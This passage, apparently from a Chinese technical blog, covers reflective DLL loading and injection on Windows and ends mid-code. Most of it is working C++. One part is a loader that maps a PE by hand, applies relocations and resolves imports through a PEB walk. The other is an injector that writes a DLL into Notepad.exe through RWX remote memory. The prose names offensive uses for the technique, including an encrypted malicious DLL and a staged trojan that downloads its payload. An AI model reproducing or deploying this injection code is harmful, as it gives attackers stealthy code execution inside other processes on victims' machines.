class="hljs-number">0</span>; j &lt; dwSizeOfRawData; j++) &#123;<br>            chDestMem[j] = chSrcMem[j];<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (dwVirtualSize &gt; dwSizeOfRawData) &#123;<br>            <span class="hljs-type">char</span>* start = chDestMem + dwSizeOfRawData;<br>            <span class="hljs-type">char</span>* end = chDestMem + dwVirtualSize;<br>            <span class="hljs-keyword">while</span> (start &lt; end) &#123;<br>                *start++ = <span class="hljs-number">0</span>;<br>            &#125;<br>        &#125;<br><br>        pSec++;<br>    &#125;<br><br>    <span class="hljs-comment">//开始检测并加载重定位表</span><br>    PIMAGE_BASE_RELOCATION pBaseReloc = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)pNTheader-&gt;OptionalHeader.DataDirectory[<span class="hljs-number">5</span>].VirtualAddress + (ULONG_PTR)pAlloc);<br>    <span class="hljs-comment">//重定位表指针通过NT结构的数据目录表查找到位置</span><br>    <span class="hljs-type">int</span> SizeOfBaseReloc = pNTheader-&gt;OptionalHeader.DataDirectory[<span class="hljs-number">5</span>].Size;<span class="hljs-comment">//重定位表的大小也在NT结构中 </span><br>    <span class="hljs-keyword">if</span> (pNTheader-&gt;OptionalHeader.DataDirectory[<span class="hljs-number">5</span>].VirtualAddress != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-keyword">do</span> &#123;<br>            PWORD TypeOffset = (WORD*)((PBYTE)pBaseReloc + <span class="hljs-number">8</span>);          <span class="hljs-comment">//跳过前两个元素（不过在有的结构声明中TypeOffset不属于该结构</span><br>            <span class="hljs-type">int</span> num = (pBaseReloc-&gt;SizeOfBlock - <span class="hljs-number">8</span>) / <span class="hljs-number">2</span>;                <span class="hljs-comment">//SizeOfBlock规定的是该单元的大小以及TypeOffset是一字的</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; i++)<br>            &#123;<br>                WORD type = TypeOffset[i] &gt;&gt; <span class="hljs-number">12</span>;                        <span class="hljs-comment">//TypeOffset[i] &gt;&gt; 12相当于在查找TypeOffset的前四字节（类型）</span><br>                WORD offset = TypeOffset[i] &amp; <span class="hljs-number">0x0FFF</span>;                   <span class="hljs-comment">//去掉类型（前四字节）</span><br>                <span class="hljs-type">int</span> differ = <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">if</span> (type == <span class="hljs-number">3</span>)<br>                &#123;<br>                    differ = *((ULONG_PTR*)(offset + pBaseReloc-&gt;VirtualAddress + pAlloc)) - pNTheader-&gt;OptionalHeader.ImageBase;<br>                    ULONG_PTR p = (ULONG_PTR)pAlloc + differ;<br>                    <span class="hljs-type">char</span>* tagetaddr = (<span class="hljs-type">char</span>*)(ULONG_PTR)pAlloc + offset + pBaseReloc-&gt;VirtualAddress;<br>                    <span class="hljs-type">char</span>* fromeaddr = (<span class="hljs-type">char</span>*)p;<br>                    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> c = <span class="hljs-number">0</span>; c &lt; <span class="hljs-number">4</span>; c++) &#123;<br>                        tagetaddr[c] = fromeaddr[c];<br>                    &#125;<br>                &#125;<br>            &#125;<br>            SizeOfBaseReloc -= pBaseReloc-&gt;SizeOfBlock;                 <span class="hljs-comment">//通过字节大小来间接表示个数</span><br>            pBaseReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pBaseReloc + pBaseReloc-&gt;SizeOfBlock);<span class="hljs-comment">//相当于结构指针++了，不过这么看来TypeOffset好像真不属于这个结构</span><br>        &#125; <span class="hljs-keyword">while</span> (SizeOfBaseReloc);<br>    &#125;<br><br>    <span class="hljs-comment">//GetProcAddress的地址</span><br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">FARPROC</span><span class="hljs-params">(WINAPI* GETPROCADDR)</span><span class="hljs-params">(HMODULE, LPCSTR)</span></span>;<br>    <span class="hljs-comment">//LoadLibrary的地址</span><br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">HMODULE</span><span class="hljs-params">(WINAPI* LOADLIBRARYA)</span><span class="hljs-params">(LPCSTR)</span></span>;<br><br>    GETPROCADDR pGetProcAddress = <span class="hljs-literal">NULL</span>;<br>    LOADLIBRARYA pLoadLibraryA = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-comment">//得到TEB的地址，通过TEB找到PEB</span><br>    PTEB pTEB = (PTEB)__readgsqword(<span class="hljs-number">0x30</span>);<br>    PPEB pPEB = pTEB-&gt;ProcessEnvironmentBlock;<br>    <span class="hljs-comment">// 获取PEB.Ldr</span><br>    PPEB_LDR_DATA pLdr = pPEB-&gt;Ldr;<br><br>    <span class="hljs-comment">// 遍历模块列表，找到 kernel32.dll</span><br>    PLIST_ENTRY pListHead = &amp;pLdr-&gt;InMemoryOrderModuleList;<br>    PLIST_ENTRY pCurrentEntry = pListHead-&gt;Flink;<br>    <span class="hljs-keyword">while</span> (pCurrentEntry &amp;&amp; pCurrentEntry != pListHead)<br>    &#123;<br>        PLDR_DATA_TABLE_ENTRY pEntry = <span class="hljs-built_in">CONTAINING_RECORD</span>(pCurrentEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);<br>        <span class="hljs-keyword">if</span> (pEntry &amp;&amp; pEntry-&gt;FullDllName.Buffer)<br>        &#123;<br>            <span class="hljs-type">wchar_t</span>* dllName = pEntry-&gt;FullDllName.Buffer;<br>            <span class="hljs-comment">// 提取 DLL 名称</span><br>            <span class="hljs-type">wchar_t</span>* fileName = <span class="hljs-built_in">ExtractDllName</span>(dllName);<br>            <span class="hljs-comment">// 目标 DLL 名称kernel32.dll</span><br>            <span class="hljs-type">wchar_t</span> a[] = &#123; <span class="hljs-string">L&#x27;k&#x27;</span>, <span class="hljs-string">L&#x27;e&#x27;</span>, <span class="hljs-string">L&#x27;r&#x27;</span>, <span class="hljs-string">L&#x27;n&#x27;</span>, <span class="hljs-string">L&#x27;e&#x27;</span>, <span class="hljs-string">L&#x27;l&#x27;</span>, <span class="hljs-string">L&#x27;3&#x27;</span>, <span class="hljs-string">L&#x27;2&#x27;</span>, <span class="hljs-string">L&#x27;.&#x27;</span>, <span class="hljs-string">L&#x27;d&#x27;</span>, <span class="hljs-string">L&#x27;l&#x27;</span>, <span class="hljs-string">L&#x27;l&#x27;</span>, <span class="hljs-string">L&#x27;\0&#x27;</span> &#125;;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">CompareDllName</span>(fileName, a)) &#123;<br>                HMODULE hKernel32 = (HMODULE)pEntry-&gt;DllBase;<br>                PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hKernel32 + ((PIMAGE_DOS_HEADER)hKernel32)-&gt;e_lfanew);<br>                <span class="hljs-comment">// 获取导出表的地址</span><br>                PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hKernel32 + pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);<br>                <span class="hljs-comment">// 获取导出表的各个信息</span><br>                DWORD* pFunctionNames = (DWORD*)((BYTE*)hKernel32 + pExportDirectory-&gt;AddressOfNames);<br>                DWORD* pFunctionAddresses = (DWORD*)((BYTE*)hKernel32 + pExportDirectory-&gt;AddressOfFunctions);<br>                WORD* pFunctionOrdinals = (WORD*)((BYTE*)hKernel32 + pExportDirectory-&gt;AddressOfNameOrdinals);<br><br>                <span class="hljs-comment">// 遍历导出表，查找 LoadLibraryA</span><br>                <span class="hljs-type">char</span> targetName1[<span class="hljs-number">50</span>] = &#123; <span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>                <span class="hljs-comment">// 遍历导出表，查找 GetProcAddress</span><br>                <span class="hljs-type">char</span> targetName2[<span class="hljs-number">50</span>] = &#123; <span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>                <span class="hljs-type">int</span> isP = <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; pExportDirectory-&gt;NumberOfNames; i++) &#123;<br>                    <span class="hljs-type">char</span>* functionName = (<span class="hljs-type">char</span>*)((BYTE*)hKernel32 + pFunctionNames[i]);<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">CompareStrings</span>(functionName, targetName1)) &#123;<br>                        <span class="hljs-comment">// 找到函数名，获取其地址</span><br>                        DWORD functionRVA = pFunctionAddresses[pFunctionOrdinals[i]];<br>                        pLoadLibraryA = (LOADLIBRARYA)((BYTE*)hKernel32 + functionRVA);<br>                        isP++;<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">CompareStrings</span>(functionName, targetName2)) &#123;<br>                        <span class="hljs-comment">// 找到函数名，获取其地址</span><br>                        DWORD functionRVA = pFunctionAddresses[pFunctionOrdinals[i]];<br>                        pGetProcAddress = (GETPROCADDR)((BYTE*)hKernel32 + functionRVA);<br>                        isP++;<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (isP == <span class="hljs-number">2</span>) &#123;<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">break</span>; <span class="hljs-comment">// 找到后退出</span><br>            &#125;<br>        &#125;<br>        pCurrentEntry = pCurrentEntry-&gt;Flink;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!pLoadLibraryA &amp;&amp; !pGetProcAddress)<br>    &#123;<br>        <span class="hljs-type">char</span> foece[] = <span class="hljs-string">&quot;无法获取 LoadLibraryA 地址，请检查目标进程模块&quot;</span>;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">char</span> sucsess[] = <span class="hljs-string">&quot;sucsess&quot;</span>;<br>    &#125;<br><br>    PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)(pNTheader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + pAlloc);<br>    <span class="hljs-comment">//这个是IID的指针</span><br>    <span class="hljs-keyword">if</span> (pImport != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-keyword">while</span> (pImport-&gt;Name != <span class="hljs-literal">NULL</span>)<br>        &#123;<br>            <span class="hljs-type">char</span> DLLname[<span class="hljs-number">50</span>] = &#123; <span class="hljs-number">0</span> &#125;; <span class="hljs-comment">// 定义一个存储 DLL 名称的缓冲区</span><br>            <span class="hljs-type">char</span>* pDLLName = (<span class="hljs-type">char</span>*)(pImport-&gt;Name + pAlloc); <span class="hljs-comment">// 获取 DLL 名称的地址</span><br><br>            <span class="hljs-comment">// 手动将名称拷贝到 DLLname 缓冲区</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">sizeof</span>(DLLname) - <span class="hljs-number">1</span>; i++)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (pDLLName[i] == <span class="hljs-string">&#x27;\0&#x27;</span>) <span class="hljs-comment">// 遇到字符串结束符时停止</span><br>                    <span class="hljs-keyword">break</span>;<br>                DLLname[i] = pDLLName[i]; <span class="hljs-comment">// 拷贝字符</span><br>            &#125;<br>            DLLname[<span class="hljs-built_in">sizeof</span>(DLLname) - <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>; <span class="hljs-comment">// 确保缓冲区以 &#x27;\0&#x27; 结尾</span><br><br>            HMODULE hProcess = <span class="hljs-built_in">pLoadLibraryA</span>(DLLname);               <span class="hljs-comment">//通过名称找句柄</span><br>            <span class="hljs-keyword">if</span> (!hProcess)<br>            &#123;<br>                <span class="hljs-keyword">return</span> FALSE;<br>            &#125;<br>            PIMAGE_THUNK_DATA64 pINT = (PIMAGE_THUNK_DATA64)(pImport-&gt;OriginalFirstThunk + pAlloc);<br>            PIMAGE_THUNK_DATA64 pIAT = (PIMAGE_THUNK_DATA64)(pImport-&gt;FirstThunk + pAlloc);<br>            <span class="hljs-keyword">while</span> ((ULONG_PTR)(pINT-&gt;u1.AddressOfData) != <span class="hljs-literal">NULL</span>)<br>            &#123;<br>                PIMAGE_IMPORT_BY_NAME pFucname = (PIMAGE_IMPORT_BY_NAME)(pINT-&gt;u1.AddressOfData + pAlloc);  <span class="hljs-comment">//找DLL中函数的名字</span><br>                <span class="hljs-keyword">if</span> (pINT-&gt;u1.AddressOfData &amp; IMAGE_ORDINAL_FLAG32)<span class="hljs-comment">//判断如果是序号就是第一种处理方式</span><br>                &#123;<br>                    pIAT-&gt;u1.AddressOfData = (ULONG_PTR)(<span class="hljs-built_in">pGetProcAddress</span>(hProcess, (LPCSTR)(pINT-&gt;u1.AddressOfData)));<span class="hljs-comment">//通过序号来获取地址</span><br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    pIAT-&gt;u1.AddressOfData = (ULONG_PTR)(<span class="hljs-built_in">pGetProcAddress</span>(hProcess, pFucname-&gt;Name));             <span class="hljs-comment">//通过函数名来获取地址</span><br>                &#125;<br>                pINT++;<br>                pIAT++;<br>            &#125;<br>            pImport++;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//最后的操作就是修正程序的入口地址</span><br>    PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)(pAlloc + pDOSheader-&gt;e_lfanew);<br>    FARPROC EOP = (FARPROC)((LPBYTE)pAlloc + pNT-&gt;OptionalHeader.AddressOfEntryPoint);<br>    <span class="hljs-built_in">EOP</span>();<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="2-反射注入-ReflectiveInjection"><a href="#2-反射注入-ReflectiveInjection" class="headerlink" title="2. 反射注入 ReflectiveInjection"></a>2. 反射注入 ReflectiveInjection</h1><h2 id="2-1-原理描述"><a href="#2-1-原理描述" class="headerlink" title="2.1 原理描述"></a>2.1 原理描述</h2><p><strong>原理</strong>: 注入器无法直接调用 DLL 的导出函数，因为 DLL 尚未被 OS 加载，且地址是未知的。它必须手动找到引导函数 (<code>ReflectLoader</code>) 在 Raw Data 中的物理偏移，并创建一个线程去执行它。</p>
+<p>该代码只是验证反射加载器成效的 demo，如果想要实现进一步利用的场景可以参考一下场景。</p>
+<ol>
+<li>白+黑：将黑 dll 的进行编码加密后写入到反射加载器中，后续反射加载器直接读取dll编码内容解密解析布局，通过main执行。</li>
+<li>分阶段stage：ReflectiveInjection作为木马，执行后从互联网中读取 dll 文件，将 dll 文件注入进程然后调用其导出函数，实现反射 dll 注入。</li>
+</ol>
+<h2 id="2-2-代码实现"><a href="#2-2-代码实现" class="headerlink" title="2.2 代码实现"></a>2.2 代码实现</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fstream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br><span class="hljs-comment">// 获取进程ID</span><br><span class="hljs-function">DWORD <span class="hljs-title">GetProcessIdByName</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* processName)</span> </span>&#123;<br>    DWORD pid = <span class="hljs-number">0</span>;<br>    HANDLE hSnap = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (hSnap == INVALID_HANDLE_VALUE) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    PROCESSENTRY32W pe = &#123; <span class="hljs-built_in">sizeof</span>(pe) &#125;;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">Process32FirstW</span>(hSnap, &amp;pe)) &#123;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">wcscmp</span>(pe.szExeFile, processName) == <span class="hljs-number">0</span>) &#123;<br>                pid = pe.th32ProcessID;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Process32NextW</span>(hSnap, &amp;pe));<br>    &#125;<br>    <span class="hljs-built_in">CloseHandle</span>(hSnap);<br>    <span class="hljs-keyword">return</span> pid;<br>&#125;<br><br><span class="hljs-comment">// 将RVA转换为文件偏移（FOA）</span><br><span class="hljs-function">DWORD <span class="hljs-title">RVAtoFOA</span><span class="hljs-params">(DWORD rva, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* dllBuffer)</span> </span>&#123;<br>    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dllBuffer;<br>    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(dllBuffer + dos-&gt;e_lfanew);<br>    PIMAGE_SECTION_HEADER sec = (PIMAGE_SECTION_HEADER)((BYTE*)nt + <span class="hljs-built_in">sizeof</span>(IMAGE_NT_HEADERS));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++) &#123;<br>        <span class="hljs-keyword">if</span> (rva &gt;= sec[i].VirtualAddress &amp;&amp; rva &lt; sec[i].VirtualAddress + sec[i].SizeOfRawData)<br>            <span class="hljs-keyword">return</span> sec[i].PointerToRawData + (rva - sec[i].VirtualAddress);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0xFFFFFFFF</span>;<br>&#125;<br><br><span class="hljs-comment">// 获取ReflectiveLoader的文件偏移（FOA）</span><br><span class="hljs-function">DWORD <span class="hljs-title">GetReflectiveLoaderFOA</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* dllBuffer)</span> </span>&#123;<br>    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dllBuffer;<br>    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(dllBuffer + dos-&gt;e_lfanew);<br>    PIMAGE_SECTION_HEADER sec = (PIMAGE_SECTION_HEADER)((BYTE*)nt + <span class="hljs-built_in">sizeof</span>(IMAGE_NT_HEADERS));<br>    DWORD exportDirRVA = nt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;<br>    DWORD exportDirFOA = <span class="hljs-built_in">RVAtoFOA</span>(exportDirRVA, dllBuffer);<br>    <span class="hljs-keyword">if</span> (exportDirFOA == <span class="hljs-number">0xFFFFFFFF</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)dllBuffer + exportDirFOA);<br>    DWORD* names = (DWORD*)((BYTE*)dllBuffer + <span class="hljs-built_in">RVAtoFOA</span>(exp-&gt;AddressOfNames, dllBuffer));<br>    WORD* ords = (WORD*)((BYTE*)dllBuffer + <span class="hljs-built_in">RVAtoFOA</span>(exp-&gt;AddressOfNameOrdinals, dllBuffer));<br>    DWORD* funcs = (DWORD*)((BYTE*)dllBuffer + <span class="hljs-built_in">RVAtoFOA</span>(exp-&gt;AddressOfFunctions, dllBuffer));<br>    <span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; exp-&gt;NumberOfNames; ++i) &#123;<br>        DWORD nameFOA = <span class="hljs-built_in">RVAtoFOA</span>(names[i], dllBuffer);<br>        <span class="hljs-type">const</span> <span class="hljs-type">char</span>* name = (<span class="hljs-type">const</span> <span class="hljs-type">char</span>*)((BYTE*)dllBuffer + nameFOA);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(name, <span class="hljs-string">&quot;ReflectLoader&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>            WORD ord = ords[i];<br>            DWORD funcRVA = funcs[ord];<br>            DWORD funcFOA = <span class="hljs-built_in">RVAtoFOA</span>(funcRVA, dllBuffer);<br>            <span class="hljs-keyword">return</span> funcFOA;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 1. 配置参数</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* dllPath = <span class="hljs-string">&quot;Path to ReflectiveLoader.dll&quot;</span>; <span class="hljs-comment">// 你的DLL路径</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* targetProcess = <span class="hljs-string">L&quot;Notepad.exe&quot;</span>; <span class="hljs-comment">// 目标进程名</span><br>    <br><br>    <span class="hljs-comment">// 2. 读取DLL文件</span><br>    HANDLE hFile = <span class="hljs-built_in">CreateFileA</span>(dllPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="hljs-literal">NULL</span>);<br>    DWORD FIleSize = <span class="hljs-built_in">GetFileSize</span>(hFile, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* dllBuffer = <span class="hljs-keyword">new</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>[FIleSize];<br>    <span class="hljs-built_in">ZeroMemory</span>(dllBuffer, FIleSize);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">ReadFile</span>(hFile, dllBuffer, FIleSize, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>)) &#123;<br>        <span class="hljs-keyword">delete</span>[] dllBuffer;<br>        <span class="hljs-built_in">CloseHandle</span>(hFile);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">CloseHandle</span>(hFile);<br>    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)dllBuffer;<br>    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)dllBuffer + pDos-&gt;e_lfanew);<br>    DWORD ImageSize = pNt-&gt;OptionalHeader.SizeOfImage;<br>    ULONG_PTR TotalSize = ImageSize * <span class="hljs-number">2</span>;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    * 两份空间的需求</span><br><span class="hljs-comment">    * 第一份空间：存放DLL文件的原始内容（File Buffer）</span><br><span class="hljs-comment">    * 第二份空间：ReflectiveLoader在目标进程内“重建”DLL时，需要一块和 SizeOfImage 一样大的空间（Image Buffer）</span><br><span class="hljs-comment">    * 由于你只分配一块内存，通常会直接分配两倍的 SizeOfImage，以保证ReflectiveLoader有足够的空间进行操作，避免越界。</span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-comment">// 3. 获取目标进程PID</span><br>    DWORD pid = <span class="hljs-built_in">GetProcessIdByName</span>(targetProcess);<br>    <span class="hljs-keyword">if</span> (!pid) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;未找到目标进程\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;目标进程PID: &quot;</span> &lt;&lt; pid &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br><br>    <span class="hljs-comment">// 4. 打开目标进程</span><br>    HANDLE hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);<br>    <span class="hljs-keyword">if</span> (!hProcess) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;打开进程失败\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 5. 在目标进程分配内存</span><br>    LPVOID remoteDll = <span class="hljs-built_in">VirtualAllocEx</span>(hProcess, <span class="hljs-literal">NULL</span>, TotalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-keyword">if</span> (!remoteDll) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;分配内存失败\n&quot;</span>;<br>        <span class="hljs-built_in">CloseHandle</span>(hProcess);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 6. 写入DLL到目标进程</span><br>    SIZE_T written = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">WriteProcessMemory</span>(hProcess, remoteDll, dllBuffer, FIleSize, &amp;written) || written != FIleSize) &#123;<br>        std::cout &lt;&lt; <span 